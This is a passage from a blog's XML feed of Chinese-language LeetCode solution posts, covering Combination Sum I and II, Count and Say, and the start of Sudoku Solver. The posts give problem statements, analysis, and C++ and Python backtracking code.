<p>The above elevation map is represented by array [0,1,0,2,1,0,1,3,2,1,2,1]. In this case, 6 units of rain water (blue section) are being trapped. Thanks Marcos for contributing this image!</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Stack </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> greedy algorithm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[40. Combination Sum II]]></title>
      <url>/wiki/2017/10/30/Leetcode-40-Combination-Sum-II/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a collection of candidate numbers (<code>candidates</code>) and a target number (<code>target</code>), find all unique combinations in <code>candidates</code> where the candidate numbers sums to <code>target</code>.</p>
<p>Each number in <code>candidates</code> may only be used <strong>once</strong> in the combination.</p>
<p>Note:</p>
<ul>
<li>All numbers (including <code>target</code>) will be positive integers.</li>
<li>The solution set must not contain duplicate combinations.</li>
</ul>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: candidates = [10,1,2,7,6,1,5], target = 8,</span><br><span class="line">A solution set is:</span><br><span class="line">[</span><br><span class="line">  [1, 7],</span><br><span class="line">  [1, 2, 5],</span><br><span class="line">  [2, 6],</span><br><span class="line">  [1, 1, 6]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input: candidates = [2,5,2,1,2], target = 5,</span><br><span class="line">A solution set is:</span><br><span class="line">[</span><br><span class="line">  [1,2,2],</span><br><span class="line">  [5]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>40题和39题相比，主要差别在每个数字只能使用一次：在explore步骤时采用<code>i+1</code>参数。对于重复的结果，笨办法是使用set。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">combinationSum2Helper</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target, <span class="built_in">set</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; res, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; chosen, <span class="keyword">int</span> position)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// base case</span></span><br><span class="line">            res.insert(chosen);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=position; (i&lt;candidates.size()) &amp;&amp; (candidates[i]&lt;=target);i++)&#123;</span><br><span class="line">                <span class="comment">//choose</span></span><br><span class="line">                chosen.push_back(candidates[i]);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//explore</span></span><br><span class="line">                combinationSum2Helper(candidates, target-candidates[i], res, chosen, i+<span class="number">1</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//unchoose</span></span><br><span class="line">                chosen.pop_back();</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; combinationSum2(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; chosen;</span><br><span class="line">        sort(candidates.begin(), candidates.end());</span><br><span class="line">        combinationSum2Helper(candidates, target, res, chosen, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res_final(res.begin(), res.end());</span><br><span class="line">        <span class="keyword">return</span> res_final;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>有一种更巧妙的办法去除重复，需要仔细分析什么时候会出现重复。其实只有一种情况，那就是在挑选下一个元素时，有前后元素相同。所以可以直接在choose步骤，增加一句</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (i&amp;&amp;num[i]==num[i<span class="number">-1</span>]&amp;&amp;i&gt;position) <span class="keyword">continue</span>;  <span class="comment">// check duplicate combination</span></span><br></pre></td></tr></table></figure>
<p>完整的程序为</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">combinationSum2Helper</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; res, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; chosen, <span class="keyword">int</span> position)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// base case</span></span><br><span class="line">            res.push_back(chosen);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=position; (i&lt;candidates.size()) &amp;&amp; (candidates[i]&lt;=target);i++)&#123;</span><br><span class="line">                <span class="keyword">if</span> ((i&gt;position) &amp;&amp; (candidates[i]== candidates[i<span class="number">-1</span>]))&#123;<span class="comment">// 跳过重复</span></span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//choose</span></span><br><span class="line">                    chosen.push_back(candidates[i]);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//explore</span></span><br><span class="line">                    combinationSum2Helper(candidates, target-candidates[i], res, chosen, i+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//unchoose</span></span><br><span class="line">                    chosen.pop_back();</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; combinationSum2(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; chosen;</span><br><span class="line">        sort(candidates.begin(), candidates.end());</span><br><span class="line">        combinationSum2Helper(candidates, target, res, chosen, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[39. Combination Sum]]></title>
      <url>/wiki/2017/10/30/Leetcode-39-Combination-Sum/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a set of candidate numbers (<code>candidates</code>) (<strong>without duplicates</strong>) and a target  number (<code>target</code>), find all unique combinations in candidates where the <code>candidate</code> numbers sums to <code>target</code>.</p>
<p>The <strong>same</strong> repeated number may be chosen from candidates unlimited number of times.</p>
<p>Note:</p>
<ul>
<li>All numbers (including <code>target</code>) will be positive integers.</li>
<li>The solution set must not contain duplicate combinations.</li>
</ul>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input: candidates = [2,3,6,7], target = 7,</span><br><span class="line">A solution set is:</span><br><span class="line">[</span><br><span class="line">  [7],</span><br><span class="line">  [2,2,3]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: candidates = [2,3,5], target = 8,</span><br><span class="line">A solution set is:</span><br><span class="line">[</span><br><span class="line">  [2,2,2,2],</span><br><span class="line">  [2,3,3],</span><br><span class="line">  [3,5]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>典型的backtracking类型题目。关键是输出后的结果会有重复。使用set能将重复的结果剔除。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">combinationSumHelper</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target, <span class="built_in">set</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; result, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;chosen)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// base case</span></span><br><span class="line">            <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; chosen_sorted(chosen.begin(), chosen.end());</span><br><span class="line">            sort(chosen_sorted.begin(), chosen_sorted.end());</span><br><span class="line">            result.insert(chosen_sorted);</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator iter=candidates.begin(); iter!=candidates.end(); iter++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (target&gt;=*iter)&#123;</span><br><span class="line">                    <span class="comment">//choose</span></span><br><span class="line">                    <span class="keyword">int</span> s = *iter;</span><br><span class="line">                    chosen.push_back(s);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//explore</span></span><br><span class="line">                    combinationSumHelper(candidates, target-s, result, chosen);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//unchoose</span></span><br><span class="line">                    chosen.pop_back();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; combinationSum(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; chosen;</span><br><span class="line">        combinationSumHelper(candidates, target, result, chosen);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; finals(result.begin(), result.end());</span><br><span class="line">        <span class="keyword">return</span> finals;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>但其实还有更简单的方法：                                     </p>
<p>采用回溯法。由于组合中的数字要按序排列，我们先将集合中的数排序。依次把数字放入组合中，因为所有数都是正数，如果当前和已经超出目标值，则放弃；如果和为目标值，则加入结果集；如果和小于目标值，则继续增加元素。由于结果集中不允许出现重复的组合，所以增加元素时只增加当前元素及之后的元素。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">combinationSumHelper</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; res, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;chosen, <span class="keyword">int</span> position)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// base case</span></span><br><span class="line">            res.push_back(chosen);</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=position; (i&lt;candidates.size()) &amp;&amp; (candidates[i]&lt;= target); i++ )&#123;</span><br><span class="line">                <span class="comment">//choose</span></span><br><span class="line">                chosen.push_back(candidates[i]);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//explore</span></span><br><span class="line">                combinationSumHelper(candidates, target-candidates[i], res, chosen, i);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//unchoose</span></span><br><span class="line">                chosen.pop_back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; combinationSum(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; chosen;</span><br><span class="line">        sort(candidates.begin(), candidates.end());</span><br><span class="line">        combinationSumHelper(candidates, target, res, chosen, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>题目难点在于重复的处理和排序。                           </p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[38. Count and Say]]></title>
      <url>/wiki/2017/10/30/Leetcode-38-Count-and-Say/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>The count-and-say sequence is the sequence of integers with the first five terms as following:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.     1</span><br><span class="line">2.     11</span><br><span class="line">3.     21</span><br><span class="line">4.     1211</span><br><span class="line">5.     111221</span><br></pre></td></tr></table></figure>
<p><code>1</code> is read off as <code>&quot;one 1&quot;</code> or <code>11</code>.<br><code>11</code> is read off as <code>&quot;two 1s&quot;</code> or <code>21</code>.<br><code>21</code> is read off as <code>&quot;one 2, then one 1&quot;</code> or <code>1211</code>.</p>
<p>Given an integer $n$, generate the nth term of the count-and-say sequence.</p>
<p>Note: Each term of the sequence of integers will be represented as a string.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1</span><br><span class="line">Output: &quot;1&quot;</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 4</span><br><span class="line">Output: &quot;1211&quot;</span><br></pre></td></tr></table></figure>
<h2 id="题意分析："><a href="#题意分析：" class="headerlink" title="题意分析："></a>题意分析：</h2><p>　　本题是将数字从1开始，将当前数字转化为口语对应的数字。比如1口语是1个1，记作11；11读作2个1，记作21；21读作1个2，1个1，记作1211……</p>
<p>　　‘1’是第一个数字，根据输入的数字n，计算第n个这样的数字。</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(self, nn)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nn: str</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        result = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(nn):</span><br><span class="line"></span><br><span class="line">            count =  <span class="number">1</span>       </span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> i+<span class="number">1</span> &lt; len(nn) <span class="keyword">and</span> nn[i] == nn[i+<span class="number">1</span>]:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            result += str(count)</span><br><span class="line">            result += str(nn[i])</span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">countAndSay</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>: <span class="keyword">return</span> str(<span class="number">1</span>)</span><br><span class="line">        result = str(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n):</span><br><span class="line">            result = self.say(result)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[37. Sudoku Solver]]></title>
      <url>/wiki/2017/10/30/Leetcode-37-Sudoku-Solver/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Write a program to solve a Sudoku puzzle by filling the empty cells.</p>
<p>A sudoku solution must satisfy all of the following rules:</p>
<p>Each of the digits <code>1-9</code> must occur exactly once in each row.<br>Each of the digits <code>1-9</code> must occur exactly once in each column.<br>Each of the the digits <code>1-9</code> must occur exactly once in each of the 9 <code>3x3</code> sub-boxes of the grid.<br>Empty cells are indicated by the character <code>.</code>.</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15272271861134.png" alt=""></p>
<p>A sudoku puzzle…</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15272271901676.png" alt=""></p>
<p>…and its solution numbers marked in red.</p>
<p>Note:</p>
<ul>
<li>The given board contain only digits <code>1-9</code> and the character <code>.</code>.</li>
<li>You may assume that the given Sudoku puzzle will have a single unique solution.</li>
<li>The given board size is always <code>9x9</code>.</li>
</ul>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 判断数独是否有效</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValidSudoku</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&gt; &amp;board)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> used1[<span class="number">9</span>][<span class="number">9</span>] = &#123;<span class="number">0</span>&#125;, used2[<span class="number">9</span>][<span class="number">9</span>] = &#123;<span class="number">0</span>&#125;, used3[<span class="number">9</span>][<span class="number">9</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; board.size(); ++ i)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; board[i].size(); ++ j)</span><br><span class="line">                <span class="keyword">if</span>(board[i][j] != <span class="string">'.'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">int</span> num = board[i][j] - <span class="string">'0'</span> - <span class="number">1</span>, k = i / <span class="number">3</span> * <span class="number">3</span> + j / <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">if</span>(used1[i][num] || used2[j][num] || used3[k][num])&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    used1[i][num] = used2[j][num] = used3[k][num] = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 判断Sudoku是否已经填满，如果不填满返回一个空缺位置</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; isfull(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span 